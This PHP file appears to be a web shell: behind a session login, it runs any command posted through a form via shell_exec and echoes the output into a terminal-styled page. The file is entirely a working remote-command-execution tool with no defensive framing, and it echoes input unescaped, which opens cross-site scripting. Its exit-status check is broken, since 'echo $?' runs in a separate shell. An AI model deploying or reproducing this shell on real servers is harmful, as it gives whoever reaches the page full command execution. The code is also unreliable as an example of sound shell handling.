<?php
session_start();

$processUser = posix_getpwuid(posix_geteuid());
$processUsername = $processUser['name'];

// checking if the user has logged in with a session
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {

    // store previous output in a session variable as text.
    // separate the outputs by a line break
    if (isset($_SESSION['output'])) {
        $_SESSION['output'] = $_SESSION['output'] . "<br>";
    } else {
        $_SESSION['output'] = "";
    }

    // display the previous output
    echo $_SESSION['output'];

    // if the user has logged in, then we will display the shell
    // and then we will execute the command
    if (isset($_POST['command']) && $_POST['command'] != "") {

        // append the command to the session variable
        $_SESSION['output'] = $_SESSION['output'] . $processUsername .'>'. $_POST['command'] . "<br>";

        $outputstr = '<pre>';
        $res = shell_exec($_POST['command'] . " 2>&1");
        $retval = shell_exec("echo $?");
        if ($retval == 0) {
            $outputstr = $outputstr . "<span style='color: #00ff00;'>";
        } else {
            $outputstr = $outputstr . "<span style='color: #ff0000;'>";
        }

        $outputstr = $outputstr . $res . "</span></pre>";

        echo $processUsername .'>'. $_POST['command'] . "<br>";
        echo $outputstr;

    }


    // add the output to the session variable
    $_SESSION['output'] = $_SESSION['output'] . $outputstr;


    // the form for the shell is acting as a command line prompt
    echo "<form method='post' action='shell.php'>
    <input type='text' name='command' placeholder='Command'>
    <input type='submit' value='Execute'>
    </form>";

    // autoselect the command input box
    echo "<script>document.getElementsByName('command')[0].focus();</script>";
    // enter key will submit the form
    echo "<script>document.getElementsByName('command')[0].addEventListener('keyup', function(event) {
        if (event.keyCode === 13) {
            event.preventDefault();
            document.getElementsByName('command')[0].click();
        }
    });</script>";

} else {
    // if the user has not logged in, then we will redirect the user to the loginshell.php page
    header("Location: loginshell.php");
}

?>

<style>
    body {
        background-color: #000000;
        color: #ffffff;
    }
    /* making the form look like a command line prompt */
    input {
        /* removing border outline to make it look like a prompt */
        background-color: #000000;
        color: #ffffff;
        border: none;
        outline: none;
        width: 100%;
    }
    input:focus,
    input:active,
    input:hover {
        border: none;
        outline: none;
    }
    input[type="submit"] {
        /* transparent button */
        background-color: transparent;
        /* transparent text */
        color: transparent;
        /* removing border outline to make it look like a prompt */
        border: none;

    }

</style>
